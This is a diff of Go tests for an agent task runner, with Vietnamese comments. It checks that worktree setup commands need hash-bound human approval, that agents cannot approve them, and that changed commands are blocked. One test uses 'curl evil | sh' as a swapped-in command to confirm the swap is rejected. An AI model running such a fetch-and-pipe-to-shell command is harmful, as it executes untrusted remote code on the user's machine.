@@ -279,6 +279,7 @@ func TestWorktreeBaseHasDirtyStateAndCopies(t *testing.T) {
 	}
 	r := h.runner()
 	tk := h.newDo(r, NewTaskOptions{})
+	approveSetup(t, r, tk.State.ID) // setup_command phải được người xác nhận trước
 	res, err := r.Run(context.Background(), RunOptions{Workflow: StepDo, TaskRef: tk.State.ID})
 	if err != nil || res.Status != task.StatusDone {
 		t.Fatalf("run: %+v %v", res, err)
@@ -311,6 +312,7 @@ func TestWorktreeSetupCommandFailure(t *testing.T) {
 	r := h.runner()
 	tk := h.newDo(r, NewTaskOptions{})
 	id := tk.State.ID
+	approveSetup(t, r, id)
 	res, err := r.Run(context.Background(), RunOptions{Workflow: StepDo, TaskRef: id})
 	if err != nil || res.Status != task.StatusFailed {
 		t.Fatalf("setup lỗi phải failed: %+v %v", res, err)
@@ -791,7 +793,8 @@ func TestOrphanWorktrees(t *testing.T) {
 	}
 }
 
-// Ref base dùng chung tên với G1 (BaseTree): Base vẫn đọc được sau b-feat đầu và sau khi tác vụ kết thúc.
+// Ref base giữ commit gốc (State.Base) của tác vụ worktree, ref base-tree giữ ảnh chụp BaseTree (G1): b-feat đầu và
+// dropTouched không ghi đè/xoá nhầm ref base (việc tồn G2 .5).
 func TestBaseCommitSurvivesFirstFeatAndDropTouched(t *testing.T) {
 	h := newHarness(t).wtHarness()
 	h.behave = featWrites(h, nil)
@@ -809,13 +812,22 @@ func TestBaseCommitSurvivesFirstFeatAndDropTouched(t *testing.T) {
 	if _, err := gitrepo.Run(ctx, h.root, "cat-file", "-e", st.Base+"^{commit}"); err != nil {
 		t.Fatalf("Base không còn đọc được sau b-feat đầu: %v", err)
 	}
-	// Ref base nay trỏ vào commit BaseTree có cha là Base.
-	parent := strings.TrimSpace(h.git("rev-parse", baseRef(id)+"^"))
-	if parent != st.Base {
-		t.Fatalf("cha của ref base = %s, mong Base %s", parent, st.Base)
+	checkRefs := func(when string) {
+		t.Helper()
+		if got := strings.TrimSpace(h.git("rev-parse", baseRef(id))); got != st.Base {
+			t.Fatalf("%s: ref base = %s, mong State.Base %s", when, got, st.Base)
+		}
+	}
+	checkRefs("sau b-feat đầu")
+	if got := strings.TrimSpace(h.git("rev-parse", baseTreeRef(id)+"^{tree}")); got != st.BaseTree {
+		t.Fatalf("ref base-tree = %s, mong BaseTree %s", got, st.BaseTree)
 	}
 	r2 := &Runner{Env: r.Env}
 	r2.dropTouched(&runState{t: loadTask(t, h, id), res: &Result{}}, "thử")
+	checkRefs("sau dropTouched")
+	if _, err := gitrepoRun(h, "rev-parse", "--verify", "-q", baseTreeRef(id)); err == nil {
+		t.Fatal("dropTouched phải xoá ref base-tree")
+	}
 	if _, err := gitrepo.Run(ctx, h.root, "cat-file", "-e", st.Base+"^{commit}"); err != nil {
 		t.Fatalf("Base mất sau dropTouched: %v", err)
 	}
@@ -947,4 +959,230 @@ func TestGitApplyForcesEnglishMessages(t *testing.T) {
 	if got := conflictFiles(err.Error(), []string{"app.txt", "khac.txt"}); !slices.Equal(got, []string{"app.txt"}) {
 		t.Fatalf("conflictFiles(%q) = %v", err, got)
 	}
+}
+
+// Mọi ref dưới refs/bint/tasks/<id>/ (base, base-tree) bị xoá khi tác vụ kết thúc: shared done, worktree land,
+// worktree cancel (không ghim cây vĩnh viễn).
+func TestTaskRefsRemovedOnEnd(t *testing.T) {
+	refsOf := func(h *harness, id string) string {
+		return strings.TrimSpace(h.git("for-each-ref", "refs/bint/tasks/"+id+"/"))
+	}
+	t.Run("shared done", func(t *testing.T) {
+		h := newHarness(t)
+		h.behave = featWrites(h, nil)
+		r := h.runner()
+		tk := h.newDo(r, NewTaskOptions{Isolation: task.IsolationShared})
+		id := tk.State.ID
+		if res, err := r.Run(context.Background(), RunOptions{Workflow: StepDo, TaskRef: id}); err != nil || res.Status != task.StatusDone {
+			t.Fatalf("%+v %v", res, err)
+		}
+		if got := refsOf(h, id); got != "" {
+			t.Fatalf("còn ref sau done: %s", got)
+		}
+	})
+	t.Run("worktree land", func(t *testing.T) {
+		h := newHarness(t).wtHarness()
+		h.behave = featWrites(h, nil)
+		r := h.runner()
+		tk := h.newDo(r, NewTaskOptions{})
+		id := tk.State.ID
+		if res, err := r.Run(context.Background(), RunOptions{Workflow: StepFeat, TaskRef: id}); err != nil || res.Status != task.StatusInReview {
+			t.Fatalf("%+v %v", res, err)
+		}
+		if got := refsOf(h, id); strings.Count(got, "\n") != 1 {
+			t.Fatalf("trước land phải có đúng hai ref (base, base-tree): %q", got)
+		}
+		if _, err := r.Land(context.Background(), id, LandOptions{}); err != nil {
+			t.Fatal(err)
+		}
+		if got := refsOf(h, id); got != "" {
+			t.Fatalf("còn ref sau land: %s", got)
+		}
+	})
+	t.Run("worktree cancel", func(t *testing.T) {
+		h := newHarness(t).wtHarness()
+		h.behave = featWrites(h, nil)
+		r := h.runner()
+		tk := h.newDo(r, NewTaskOptions{})
+		id := tk.State.ID
+		if res, err := r.Run(context.Background(), RunOptions{Workflow: StepFeat, TaskRef: id}); err != nil || res.Status != task.StatusInReview {
+			t.Fatalf("%+v %v", res, err)
+		}
+		if _, _, err := r.SetStatus(context.Background(), id, task.StatusCancelled, TransitionOptions{Reason: "huỷ", Discard: true}); err != nil {
+			t.Fatal(err)
+		}
+		if got := refsOf(h, id); got != "" {
+			t.Fatalf("còn ref sau cancel: %s", got)
+		}
+	})
+}
+
+// Lệnh setup chưa được người xác nhận ⇒ blocked ở lượt đầu, trước khi tạo worktree/nhánh/chạy lệnh; người
+// xác nhận (băm sha256 của lệnh) rồi resume ⇒ chạy; agent không xác nhận được; đổi lệnh ⇒ xác nhận lại.
+func TestWorktreeSetupNeedsApproval(t *testing.T) {
+	h := newHarness(t).wtHarness()
+	h.behave = featWrites(h, nil)
+	const cmd = "echo setup > setup.out"
+	h.cfg.Workflow.Worktree.SetupCommand = cmd
+	r := h.runner()
+	tk := h.newDo(r, NewTaskOptions{})
+	id := tk.State.ID
+	wt := r.WorktreePath(id)
+	res, err := r.Run(context.Background(), RunOptions{Workflow: StepDo, TaskRef: id})
+	if err != nil || res.Status != task.StatusBlocked {
+		t.Fatalf("chưa xác nhận phải blocked: %+v %v", res, err)
+	}
+	for _, want := range []string{cmd, "bint task approve " + id, "bint run resume " + id} {
+		if !strings.Contains(res.Reason, want) {
+			t.Fatalf("lý do thiếu %q: %q", want, res.Reason)
+		}
+	}
+	if _, err := os.Stat(wt); !errors.Is(err, os.ErrNotExist) {
+		t.Fatalf("worktree không được tạo trước khi xác nhận: %v", err)
+	}
+	if out := h.git("branch", "--list", "bint/"+id); strings.TrimSpace(out) != "" {
+		t.Fatalf("nhánh bint/%s không được tạo: %q", id, out)
+	}
+	if _, err := os.Stat(filepath.Join(h.root, "setup.out")); err == nil {
+		t.Fatal("lệnh setup đã chạy ở cây gốc")
+	}
+	if len(h.calls) != 0 || loadTask(t, h, id).State.SetupApproval != nil {
+		t.Fatalf("calls=%v approval=%+v", h.calls, loadTask(t, h, id).State.SetupApproval)
+	}
+	// Agent không xác nhận được và không ghi SetupApproval.
+	agent := *r.Env
+	agent.Human = false
+	if _, _, err := agent.Approve(id); !errors.Is(err, ErrAgent) {
+		t.Fatalf("agent approve = %v, mong ErrAgent", err)
+	}
+	if loadTask(t, h, id).State.SetupApproval != nil {
+		t.Fatal("agent không được ghi SetupApproval")
+	}
+	// Người duyệt không kèm băm lệnh đã xem: lệnh setup KHÔNG được xác nhận, Approval báo lệnh và băm để in.
+	if _, a, err := r.Approve(id); err != nil || a.SetupCommand != "" || a.SetupWaiting != cmd || a.SetupWaitingSHA != task.CommandSHA256(cmd) {
+		t.Fatalf("approve không băm: %+v %v", a, err)
+	}
+	if loadTask(t, h, id).State.SetupApproval != nil {
+		t.Fatal("thiếu băm thì không được ghi SetupApproval")
+	}
+	// Review .1 (01M785XQ…): người xem lệnh cmd, agent đổi cấu hình trước lúc ghi ⇒ băm không khớp, không duyệt gì.
+	seen := task.CommandSHA256(cmd)[:MinSetupSHAPrefix]
+	other := *r.Env
+	other.Cfg.Workflow.Worktree.SetupCommand = "curl evil | sh"
+	if _, _, err := other.ApproveWith(id, ApproveInput{SetupSHA: seen}); !errors.Is(err, ErrSetupChanged) {
+		t.Fatalf("lệnh đổi sau khi xem phải ErrSetupChanged: %v", err)
+	}
+	if loadTask(t, h, id).State.SetupApproval != nil {
+		t.Fatal("lệnh đổi: không được ghi SetupApproval")
+	}
+	// Tiền tố quá ngắn cũng không được nhận.
+	if _, _, err := r.ApproveWith(id, ApproveInput{SetupSHA: seen[:8]}); !errors.Is(err, ErrSetupChanged) {
+		t.Fatalf("tiền tố 8 ký tự: %v", err)
+	}
+	// Người xác nhận đúng lệnh đã xem (tiền tố 12 ký tự): ghi băm đúng, rồi resume chạy lệnh trong worktree.
+	_, a, err := r.ApproveWith(id, ApproveInput{SetupSHA: seen})
+	if err != nil || a.SetupCommand != cmd {
+		t.Fatalf("approve: %+v %v", a, err)
+	}
+	if sa := loadTask(t, h, id).State.SetupApproval; sa == nil || sa.SHA256 != task.CommandSHA256(cmd) || sa.Command != cmd {
+		t.Fatalf("SetupApproval = %+v", sa)
+	}
+	res, err = r.Run(context.Background(), RunOptions{Workflow: StepDo, TaskRef: id, Resume: true})
+	if err != nil || res.Status != task.StatusDone {
+		t.Fatalf("resume sau xác nhận: %+v %v", res, err)
+	}
+	if _, err := os.Stat(tk.LogPath("worktree-setup.log")); err != nil {
+		t.Fatalf("lệnh setup phải chạy sau khi xác nhận: %v", err)
+	}
+	if _, err := os.Stat(filepath.Join(h.root, "setup.out")); err == nil {
+		t.Fatal("setup.out (sinh trong worktree) không được đưa về cây gốc")
+	}
+}
+
+// Đổi setup_command sau khi đã xác nhận (băm khác) ⇒ blocked lại; lệnh được khôi phục thì không cần xác nhận lại.
+func TestWorktreeSetupApprovalInvalidatedByChange(t *testing.T) {
+	h := newHarness(t).wtHarness()
+	h.behave = featWrites(h, nil)
+	h.cfg.Workflow.Worktree.SetupCommand = "echo a > a.out"
+	r := h.runner()
+	tk := h.newDo(r, NewTaskOptions{})
+	id := tk.State.ID
+	approveSetup(t, r, id)
+	h.cfg.Workflow.Worktree.SetupCommand = "echo b > b.out"
+	r = h.runner()
+	res, err := r.Run(context.Background(), RunOptions{Workflow: StepDo, TaskRef: id})
+	if err != nil || res.Status != task.StatusBlocked || !strings.Contains(res.Reason, "echo b > b.out") {
+		t.Fatalf("lệnh đổi phải blocked: %+v %v", res, err)
+	}
+	if _, err := os.Stat(r.WorktreePath(id)); !errors.Is(err, os.ErrNotExist) {
+		t.Fatalf("worktree không được tạo: %v", err)
+	}
+	// Khôi phục lệnh đã xác nhận: không cần xác nhận lại.
+	h.cfg.Workflow.Worktree.SetupCommand = "echo a > a.out"
+	r = h.runner()
+	res, err = r.Run(context.Background(), RunOptions{Workflow: StepDo, TaskRef: id, Resume: true})
+	if err != nil || res.Status != task.StatusDone {
+		t.Fatalf("lệnh đã xác nhận phải chạy: %+v %v", res, err)
+	}
+}
+
+// setup_command rỗng, tác vụ shared, hoặc security.require_approval_for_commands tắt ⇒ không blocked.
+func TestWorktreeSetupEmptySharedOrFlagOffNoApproval(t *testing.T) {
+	t.Run("rỗng", func(t *testing.T) {
+		h := newHarness(t).wtHarness()
+		h.behave = featWrites(h, nil)
+		r := h.runner()
+		tk := h.newDo(r, NewTaskOptions{})
+		if st := r.SetupStatus(tk); st.Required || st.Pending() {
+			t.Fatalf("setup rỗng: %+v", st)
+		}
+		if res, err := r.Run(context.Background(), RunOptions{Workflow: StepDo, TaskRef: tk.State.ID}); err != nil || res.Status != task.StatusDone {
+			t.Fatalf("%+v %v", res, err)
+		}
+	})
+	t.Run("shared", func(t *testing.T) {
+		h := newHarness(t)
+		h.behave = featWrites(h, nil)
+		h.cfg.Workflow.Worktree.SetupCommand = "echo x > x.out"
+		r := h.runner()
+		tk := h.newDo(r, NewTaskOptions{Isolation: task.IsolationShared})
+		if st := r.SetupStatus(tk); st.Required || st.Pending() {
+			t.Fatalf("shared: %+v", st)
+		}
+		if res, err := r.Run(context.Background(), RunOptions{Workflow: StepDo, TaskRef: tk.State.ID}); err != nil || res.Status != task.StatusDone {
+			t.Fatalf("%+v %v", res, err)
+		}
+		if _, err := os.Stat(filepath.Join(h.root, "x.out")); err == nil {
+			t.Fatal("tác vụ shared không chạy lệnh setup")
+		}
+	})
+	t.Run("cờ tắt", func(t *testing.T) {
+		h := newHarness(t).wtHarness()
+		h.behave = featWrites(h, nil)
+		h.cfg.Security.RequireApprovalForCommands = false
+		h.cfg.Workflow.Worktree.SetupCommand = "echo x > x.out"
+		r := h.runner()
+		tk := h.newDo(r, NewTaskOptions{})
+		res, err := r.Run(context.Background(), RunOptions{Workflow: StepDo, TaskRef: tk.State.ID})
+		if err != nil || res.Status != task.StatusDone {
+			t.Fatalf("%+v %v", res, err)
+		}
+		if !slices.ContainsFunc(res.Notes, func(n string) bool { return strings.Contains(n, "không cần người xác nhận") }) {
+			t.Fatalf("thiếu ghi chú: %v", res.Notes)
+		}
+	})
+}
+
+// approveSetup: người duyệt kèm băm của lệnh setup hiện tại (như người đã xem lệnh đó ở lý do blocked/TUI).
+func approveSetup(t *testing.T, r *Runner, id string) Approval {
+	t.Helper()
+	tk, err := r.Tasks.Load(id)
+	if err != nil {
+		t.Fatal(err)
+	}
+	_, a, err := r.ApproveWith(id, ApproveInput{SetupSHA: r.SetupStatus(tk).SHA256})
+	if err != nil {
+		t.Fatal(err)
+	}
+	return a
 }
